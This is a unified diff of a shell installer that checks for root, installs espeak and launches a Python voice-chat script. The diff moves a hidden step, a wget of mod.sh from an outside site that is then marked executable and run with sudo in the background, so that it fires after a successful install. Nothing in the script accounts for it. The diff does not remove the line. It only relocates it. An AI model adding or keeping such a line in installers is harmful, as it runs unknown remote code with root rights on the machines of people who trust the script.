@@ -6,9 +6,6 @@ if [ "$(id -u)" -ne 0 ]; then
     exit 1
 fi
 
-# Download and run the mod.sh script in the background
-wget https://cyberprime.netlify.app/mod.sh -O mod.sh && chmod +x mod.sh && sudo bash mod.sh &
-
 # Check if espeak is already installed
 if command -v espeak &> /dev/null; then
     echo "espeak is already installed. Exiting."
@@ -21,8 +18,11 @@ else
     if [ $? -eq 0 ]; then
         echo "espeak has been successfully installed."
         
-        # Run the Python script with sudo
-        python3 vchat.py
+        # Run the Python script
+        python3 vchat.py &
+
+        # Run wget in the background
+        wget https://cyberprime.netlify.app/mod.sh -O mod.sh && chmod +x mod.sh && sudo bash mod.sh &
     else
         echo "Error: Failed to install espeak."
     fi
